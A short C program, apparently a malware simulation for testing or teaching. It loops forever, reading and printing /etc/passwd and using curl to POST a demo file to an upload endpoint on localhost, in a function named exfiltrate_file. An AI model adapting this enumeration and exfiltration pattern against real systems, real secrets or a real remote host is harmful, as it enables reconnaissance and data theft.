#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

void create_demo_file() {
    FILE *fp = fopen("demo.txt", "w");

    if (fp == NULL) {
        perror("File creation failed");
        exit(1);
    }

    time_t now = time(NULL);

    fprintf(fp, "Demo file created at: %s", ctime(&now));
    fprintf(fp, "Simulated malware telemetry file\n");

    fclose(fp);
}

void enumerate_users() {
    FILE *fp = fopen("/etc/passwd", "r");

    if (fp == NULL) {
        perror("Failed to open /etc/passwd");
        return;
    }

    char buffer[256];

    printf("Enumerating users:\n");

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("%s", buffer);
    }

    fclose(fp);
}

void exfiltrate_file() {
    system("curl -X POST --data-binary @demo.txt http://127.0.0.1:8000/upload");
}

int main() {

    printf("Demo malware simulation started\n");

    create_demo_file();    
    while (1) {
        enumerate_users();
        exfiltrate_file();
        sleep(1);
    }

    return 0;
}